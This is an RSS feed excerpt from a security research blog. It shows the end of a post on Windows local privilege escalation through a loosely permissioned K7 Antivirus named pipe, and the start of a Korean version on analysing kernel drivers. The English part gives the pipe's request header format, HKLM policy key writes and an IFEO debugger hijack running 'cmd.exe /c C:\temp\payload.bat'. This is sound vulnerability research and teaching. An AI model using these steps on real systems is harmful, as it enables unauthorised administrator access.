FILE_CREATE_PIPE_INSTANCE        FILE_APPEND_DATA        FILE_LIST_DIRECTORY        FILE_READ_ATTRIBUTES        FILE_READ_DATA        FILE_READ_EA        FILE_WRITE_ATTRIBUTES        FILE_WRITE_DATA        FILE_WRITE_EA        SYNCHRONIZE        READ_CONTROL</code></pre><p>After checking the ACL directly, as suspected, the DACL for <code>\\.\pipe\K7TSMngrService1</code> is set too loosely. Since &#x2018;file read&#x2019;, &#x2018;file write&#x2019;, and &#x2018;file append&#x2019; are allowed for Everyone, it means that virtually anyone can request a connection to this pipe to write and read. Once this is confirmed, from this point on, let&#x2019;s perform static analysis on the dispatch or parsing routines to see with our own eyes which requests lead to privilege-sensitive operations.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image20.png" alt></p><p>Now that we&#x2019;ve confirmed the permission information, it would be good to check the Named Pipe&#x2019;s server code through static analysis, right? It&#x2019;s best to check the broad structure from the creation point. For example, here we can see a flow where a Named Pipe is created with <code>CreateNamedPipeA(&quot;\\\\.\\pipe\\K7TSMngrService1&quot;, ...)</code> and, upon a successful <code>ConnectNamedPipe</code>, it dispatches to a request handler function! Once this pattern is confirmed, the next step is to check the protocol validation part, like what header is read with <code>ReadFile</code>.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image21.png" alt></p><pre><code class="hljs c"><span class="hljs-comment">// request header (28 bytes)</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">K7TS_REQ_HDR</span> {</span>  <span class="hljs-keyword">uint32_t</span> magic;      <span class="hljs-comment">// &apos;K7TS&apos;</span>  <span class="hljs-keyword">uint32_t</span> ver;        <span class="hljs-comment">// 0x1010</span>  <span class="hljs-keyword">uint32_t</span> hdr_sz;     <span class="hljs-comment">// 28</span>  <span class="hljs-keyword">uint32_t</span> reserved;   <span class="hljs-comment">// 0</span>  <span class="hljs-keyword">uint32_t</span> op;         <span class="hljs-comment">// v21</span>  <span class="hljs-keyword">uint32_t</span> in_len;     <span class="hljs-comment">// nNumberOfBytesToRead</span>  <span class="hljs-keyword">uint32_t</span> out_len;    <span class="hljs-comment">// v23</span>} K7TS_REQ_HDR;</code></pre><p>For example, to communicate with <code>\\.\pipe\K7TSMngrService1</code>, how should the request buffer be structured to succeed? Looking at the code, it performs a protocol validation routine: it targets the pipe <code>\\.\pipe\K7TSMngrService1</code>, sets <code>result = 0x4B375453(&apos;K7TS&apos;)</code>, <code>ver=0x1010</code>, <code>hdr_sz=28</code>, and limits the request type and I/O length to 1MB. Only then does it allocate a heap buffer, receive the request with <code>ReadFile</code>, pass it to an internal dispatcher to create a response, return a 36-byte response header + response body with <code>WriteFile</code>, and finally terminate the session with <code>DisconnectNamedPipe</code> and <code>CloseHandle</code>. We&#x2019;ve learned crucial information for connecting and communicating with the pipe!</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image22.png" alt></p><p>Now that we&#x2019;ve checked the validation routine, let&#x2019;s look for the part that leads to a privilege-sensitive operation, like allowing a normal user to enable administrative functions as we saw in the settings earlier. Following the string references, we could see that K7TS components directly reference registry-based policy flags through strings like <code>AdminNonAdminIsValid</code>, <code>AdminChangesNeedPassword</code>, and <code>AdminEnableNeedVerification</code>. With this single pipe request, the SYSTEM service is performing a Write to HKLM. If the validation isn&#x2019;t sufficiently restrictive, it could become a primitive for a normal user like us to perform a SYSTEM registry write.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image23.png" alt></p><p>Now, based on the information gathered above, I sent a request that satisfies the protocol conditions and checked the Process Monitor logs. Since a Named Pipe is an IPC endpoint, it&#x2019;s good to carefully check for events centered around points of change, such as registry/HKLM, service settings, file read/write, and process execution. For example, the current ProcMon log shows that after I, a normal user, send a request through the pipe, the SYSTEM-privileged <code>K7TSMngr.exe</code> performs a write operation to HKLM. By triggering writes to related keys like <code>AdminNonAdminIsValid</code>, <code>AdminChangesNeedPassword</code>, and <code>AdminChangesPasswordHash</code>, I reconfirmed that security boundaries like requiring administrator rights or allowing non-administrators could be bypassed.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image24.png" alt></p><p>Now, let&#x2019;s try the LPE. First, as a normal user, I send a connection request to <code>\\.\pipe\K7TSMngrService1</code> with a request that satisfies the K7TS header and magic format, making the SYSTEM service configure the registry settings on my behalf. Then, using HKLM IFEO, I target the key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\K7TSHlpr.exe</code> and replace the intended debugger with <code>cmd.exe /c C:\temp\payload.bat</code>. And&#x2026;? The LPE is successful! The entity processing the <code>K7TSMngrService1</code> pipe request was <code>K7TSMngr.exe</code>. Through static analysis, I was able to confirm a vulnerability where the auxiliary process <code>K7TSHlpr.exe</code>, which performs internal operations, runs in a high-privilege context. This is what allowed us to execute our desired bat file.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/en/image25.png" alt></p><p>Through privilege escalation, you can see that the user is now a member of the Administrators group in Local Group Memberships. Additionally, I hope it&#x2019;s helpful to know that vulnerabilities in Named Pipes often involve ACLs, lack of permission checks, memory vulnerabilities, path manipulation, and race conditions!</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I hope the Kernel Driver and Named Pipe collection and analysis process in this article has been helpful to you! Please note that while I referred to old CVEs when explaining the process, the verification was done in a Win11 24H2 environment. TMI, but as I was writing and opening up the tools, driver targets kept catching my eye, and I kept getting sidetracked&#x2026; haha. In the next series, we will introduce the vulnerabilities we found! Thank you.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">Windows Driver RE Methodology (voidsec)</a></li><li><a href="https://www.amd.com/en/resources/product-security/bulletin/amd-sb-6009.html">AMD-SB-6009: Radeon Graphics Kernel Driver Privilege Management</a></li><li><a href="https://owasp.org/www-chapter-seoul/#div-pastevents">OWASP Seoul(2025.07) - Windows 3rd-Party Driver LPE BugHunting</a></li><li><a href="https://blog.quarkslab.com/k7-antivirus-named-pipe-abuse-registry-manipulation-and-privilege-escalation.html">K7 Antivirus Named Pipe Abuse &#x2192; Registry Manipulation</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BugHunting/">BugHunting</category>
      
      <category domain="https://hackyboiz.github.io/tags/KernelDriver/">KernelDriver</category>
      
      <category domain="https://hackyboiz.github.io/tags/NamedPipe/">NamedPipe</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 해키보이즈 막내들이 말아주는 Windows LPE 버그헌팅 체험기 Part 1 (KR)</title>
      <link>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/ko/</link>
      <guid>https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/ko/</guid>
      <pubDate>Sun, 28 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/12/28/banda/WHS3-bughunting/ko/logo_window.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/12/28/banda/WHS3-bughunting/ko/logo_window.png" alt></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; &#xBC8C;&#xC368; 2025&#xB144;&#xC774; &#xB05D;&#xC774; &#xB098;&#xB124;&#xC694;.. &#xB2E4;&#xB4E4; &#xC5F0;&#xB9D0; &#xC798; &#xC990;&#xAE30;&#xACE0; &#xACC4;&#xC2E0;&#xAC00;&#xC694;?&#x1F385;&#xC774;&#xBC88;&#xC5D0; &#xC9C4;&#xD589;&#xB41C; &#xD654;&#xC774;&#xD2B8;&#xD587; &#xC2A4;&#xCFE8;&#xC5D0;&#xC11C; &#xC800;&#xD76C; &#xD300;&#xC6D0;&#xBD84;&#xB4E4; &#xC77C;&#xBD80;&#xAC00; &#x2018;Windows Kernel Driver &amp; Named Pipe LPE &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#x2019;&#xC774;&#xB77C;&#xB294; &#xC8FC;&#xC81C;&#xB85C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xB54C;&#xB294; 2025&#xB144; 5&#xC6D4;.. &#xBA58;&#xD1A0;&#xB2D8;&#xC758; &#x2018;&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xB4E4;&#xC5B4;&#xC640;&#x2019;&#xB77C;&#xB294; &#xD55C;&#xB9C8;&#xB514;&#xC5D0; &#xC708;&#xB3C4;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAC8C; &#xB41C; banda&#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image1.png" alt></p><p>&#xC624;&#xB298;&#xC740; &#xC81C;&#xAC00; part 1&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C;, &#xD2B9;&#xD788; Kernel Driver &amp; Named Pipe &#xBCA1;&#xD130;&#xB97C; &#xC911;&#xC810;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xAFC0;&#xD301;&#xC744; &#xC804;&#xB2EC;&#xD574;&#xB4DC;&#xB9AC;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xCD94;&#xAC00;&#xB85C; &#xC774;&#xD6C4; &#xC2DC;&#xB9AC;&#xC988;&#xB4E4;&#xC5D0;&#xC11C; &#xD300;&#xC6D0;&#xBD84;&#xB4E4;&#xC774; &#xB354;&#xC6B1; &#xC720;&#xC775;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xB2F4;&#xC544;&#xC8FC;&#xC2E4; &#xC608;&#xC815;&#xC774;&#xB2C8;, &#xAF2D; &#xC77D;&#xC5B4;&#xC8FC;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;! &#xBCF8; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C;&#xB294; Kernel Driver Named Pipe &#xB450; &#xAC00;&#xC9C0; &#xC694;&#xC18C;&#xB97C; &#xAC01;&#xAC01; &#xB3C5;&#xB9BD;&#xC801;&#xC778; LPE &#xACF5;&#xACA9; &#xD45C;&#xBA74;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;&#xC11C;, &#xC800;&#xD76C;&#xAC00; &#xCC3E;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xC18C;&#xAC1C;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.<br><br>  </p><h2 id="Chapter-1-Kernel-Driver-as-an-Attack-Surface"><a href="#Chapter-1-Kernel-Driver-as-an-Attack-Surface" class="headerlink" title="Chapter 1: Kernel Driver as an Attack Surface"></a>Chapter 1: Kernel Driver as an Attack Surface</h2><h3 id="1-1-Kernel-Driver-&#xACF5;&#xACA9;-&#xD45C;&#xBA74;-&#xAC1C;&#xC694;"><a href="#1-1-Kernel-Driver-&#xACF5;&#xACA9;-&#xD45C;&#xBA74;-&#xAC1C;&#xC694;" class="headerlink" title="1.1 Kernel Driver &#xACF5;&#xACA9; &#xD45C;&#xBA74; &#xAC1C;&#xC694;"></a><strong>1.1 Kernel Driver &#xACF5;&#xACA9; &#xD45C;&#xBA74; &#xAC1C;&#xC694;</strong></h3><p>Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; LPE &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC640; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC; &#xC0AC;&#xC774;&#xC758; &#xC2E0;&#xB8B0;&#xBC94;&#xC704; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD560; &#xB54C; &#xB9CE;&#xC774; &#xBC1C;&#xC0DD;&#xB418;&#xB294;&#xB370;, &#xC774; &#xC810;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC88B;&#xC740; &#xD0C0;&#xAC9F;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. WDM &#xAD6C;&#xC870;&#xC758; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; IRP(<code>IRP_MJ_DEVICE_CONTROL</code>)&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; <code>IO_STACK_LOCATION</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; IOCTL &#xCF54;&#xB4DC;&#xC640; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC640; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xC758; &#xAE38;&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xCEE4;&#xB110;&#xC5D0; &#xC804;&#xB2EC;&#xBC1B;&#xB294; &#xD615;&#xD0DC;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; IOCTL &#xC804;&#xB2EC; &#xBC29;&#xC2DD;&#xC5D0; &#xB530;&#xB77C; IRP &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294;&#xB370;&#xC694;! </p><p>&#xD2B9;&#xD788; WDM&#xC5D0;&#xC11C; <code>METHOD_BUFFERED</code>&#xC5D0;&#xC11C;&#xB294; I/O Manager&#xAC00; &#xCEE4;&#xB110; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xADF8; &#xD3EC;&#xC778;&#xD130;&#xB97C; <code>Irp-&gt;AssociatedIrp.SystemBuffer</code>&#xB85C; &#xC81C;&#xACF5;&#xD558;&#xBA74;&#xC11C; &#xC785;&#xB825;&#xACFC; &#xCD9C;&#xB825; &#xBAA8;&#xB450; &#xC774; &#xBC84;&#xD37C;&#xB97C; &#xD1B5;&#xD574; &#xC624;&#xAC11;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774;&#xB7F0; IOCTL &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0;&#xC11C; &#xD574;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xC810;, &#xADF8;&#xB9AC;&#xACE0; I/O Manager&#xAC00; IRP&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD2B9;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC810;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xBA74;&#xC11C; &#xD0C0;&#xAC9F;&#xC744; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br>  </p><h3 id="1-2-Kernel-Driver-&#xD0C0;&#xAC9F;-&#xC218;&#xC9D1;"><a href="#1-2-Kernel-Driver-&#xD0C0;&#xAC9F;-&#xC218;&#xC9D1;" class="headerlink" title="1.2 Kernel Driver &#xD0C0;&#xAC9F; &#xC218;&#xC9D1;"></a>1.2 Kernel Driver &#xD0C0;&#xAC9F; &#xC218;&#xC9D1;</h3><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image2.png" alt></p><p>&#xBA3C;&#xC800; &#xC81C;&#xAC00; &#xC124;&#xCE58;&#xD55C; &#xC11C;&#xB4DC;&#xD30C;&#xD2F0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xC544;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? &#xCCAB; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; FolderChangesView&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB418;&#xB294; <code>.sys</code> &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xC801;&#xD558;&#xBA74;&#xC11C;, &#xC0DD;&#xC131;&#xB41C; sys &#xD30C;&#xC77C; &#xBA85;&#xACFC; &#xC5B4;&#xB514;&#xC5D0; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xB294;&#xC9C0; Path&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image3.png" alt></p><p>&#xC800;&#xD76C;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xCEE4;&#xB110;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD558;&#xB2C8;&#xAE4C;, &#xADF8; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; DriverView&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD604;&#xC7AC; &#xCEE4;&#xB110;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBAA9;&#xB85D;&#xC744; &#xD655;&#xC778;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xB85C;&#xB4DC;&#xB41C; &#xC0C1;&#xD0DC;&#xB77C;&#xB294;&#xAC74; IOCTL, IRP &#xCC98;&#xB9AC; &#xB8E8;&#xD2F4;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xC18C;&#xB9AC;&#xACA0;&#xC8E0;?</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image4.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC800;&#xD76C;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC790;&#xB3D9;&#xD654; &#xD234;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; FolderChangesView&#xB97C; &#xD1B5;&#xD574; <code>.sys</code> &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xC6A9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCE4;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xC774; &#xBD84;&#xC11D;&#xC6A9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC798; &#xC62E;&#xACA8;&#xC84C;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.<br><br>  </p><h3 id="1-3-Kernel-Driver-&#xBD84;&#xC11D;"><a href="#1-3-Kernel-Driver-&#xBD84;&#xC11D;" class="headerlink" title="1.3 Kernel Driver &#xBD84;&#xC11D;"></a>1.3 Kernel Driver &#xBD84;&#xC11D;</h3><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBD84;&#xC11D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBD80;&#xBD84;&#xC744; &#xC21C;&#xC11C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB178;&#xCD9C;&#xB41C; <code>DeviceName</code> &#x2192; &#xC720;&#xC800; &#xC811;&#xADFC; &#xAC00;&#xB2A5; &#xC5EC;&#xBD80; &#xD310;&#xB2E8;</li><li>WinObj&#xB85C; <code>\Device</code> &#xB178;&#xB4DC; &#xC811;&#xADFC; &#xAC00;&#xB2A5; &#xC5EC;&#xBD80; &#xD655;&#xC778;</li><li>IDA/Plugin &#xD65C;&#xC6A9;&#xD574; WDM &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBD84;&#xC11D; &#xC2DC;&#xC791;</li><li>IDA&#xB97C; &#xD1B5;&#xD574; IOCTL Table &#xC2DD;&#xBCC4;</li><li><code>DispatchRoutine</code> &#xBD84;&#xC11D; &#x2192; &#xC785;&#xB825; &#xAC80;&#xC99D; &#xBD80;&#xBD84;/ &#xAD6C;&#xC870;&#xCCB4;/ &#xD544;&#xB4DC; &#xD655;&#xC778;</li><li>WinDBG&#xB97C; &#xD1B5;&#xD574; &#xD568;&#xC218; &#xD750;&#xB984;<code>/Device</code> &#xC694;&#xCCAD; &#xCC98;&#xB9AC; &#xACFC;&#xC815; &#xCD94;&#xC801;&#xD558;&#xBA74;&#xC11C; &#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xC218;&#xD589;</li></ol><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image5.png" alt></p><p>&#xBA3C;&#xC800; DriverEntry&#xC5D0;&#xC11C; Device, Symlink&#xAC00; &#xB178;&#xCD9C;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774; &#xCCAB; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;&#xC785;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xCC98;&#xB7FC; Device Name&#xC774; <code>\Device\PdFwKrnl</code>, Symlink&#xAC00; <code>\DosDevices\PdFwKrnl</code> &#xAC19;&#xC740; &#xC2DD;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xB2E4;&#xBA74;, &#xC774; &#xB2E8;&#xACC4;&#xB97C; &#xD1B5;&#xD574; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; <code>CreateFile/DeviceControl</code>&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xAC00;&#xB2A5;&#xD55C; &#xC9C4;&#xC785;&#xC810;&#xC744; &#xD655;&#xBCF4;&#xD588;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. <code>DriverObject-&gt;MajorFunction</code> &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD1B5;&#xD574;<code>IRP_MJ_DEVICE_CONTROL</code>&#xC774; &#xC5B4;&#xB5A4; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;(<code>DispatchDeviceControl</code>)&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image6.png" alt></p><p><code>\Device</code>&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0C8;&#xB2E4;&#xBA74; &#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xC9C4;&#xC785;&#xC810;&#xC744; &#xB178;&#xCD9C;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;, &#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC00; &#xB204;&#xAD6C;&#xD55C;&#xD14C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC5F4;&#xB824;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. WinObj&#xC5D0;&#xC11C; <code>\Device</code> &#xC544;&#xB798;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xCC3E;&#xC740; Device Object&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC0DD;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, Symlink&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Device&#xC640; Symlink&#xC758; Security &#xD0ED;&#xC744; &#xC5F4;&#xC5B4;&#xC11C; Everyone&#xC778; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; Read Write &#xAD8C;&#xD55C;&#xC774; &#xC5F4;&#xB824;&#xC788;&#xB294;&#xC9C0; &#xAF2D; &#xD655;&#xC778;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;! &#xC5F4;&#xB824;&#xC788;&#xC5B4;&#xC57C; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xACE0; IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image7.png" alt></p><p>&#xC774;&#xD6C4; IDA&#xC758; DriverBuddy&#xB97C; &#xD1B5;&#xD574; &#xC8FC;&#xC694; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC744; &#xBE60;&#xB974;&#xAC8C; &#xD655;&#xC778;&#xD558;&#xACE0;, WDM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC778;&#xC9C0; &#xC2DD;&#xBCC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. DriverBuddy&#xAC00; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; API &#xD638;&#xCD9C; &#xD754;&#xC801;&#xB4E4;&#xC744; &#xCC3E;&#xC544;&#xC8FC;&#xB294;&#xB370;, &#xC608;&#xC2DC;&#xB85C; &#xC704;&#xC5D0;&#xC11C; &#xB098;&#xC628; <code>MmMapIoSpace</code>, <code>MmUnmapIoSpace</code>, <code>MmBuildMdlForNonPagedPool</code>, <code>MmMapLockedPages</code> &#xAC19;&#xC740; &#xD638;&#xCD9C; &#xC9C0;&#xC810;&#xB4E4;&#xC774; <code>DispatchDeviceControl</code> &#xADFC;&#xCC98;&#xC5D0; &#xC788;&#xB2E4;&#xB294;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; <code>MmMapIoSpace</code>&#xAC19;&#xC740; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xCEE4;&#xB110; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xB8E8;&#xD2F4;, &#xC989; &#xBB3C;&#xB9AC;&#xC8FC;&#xC18C;, &#xAE38;&#xC774;, &#xCE90;&#xC2DC; &#xD0C0;&#xC785;&#xC744; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB420; &#xC218; &#xC788;&#xC73C;&#xB2C8; 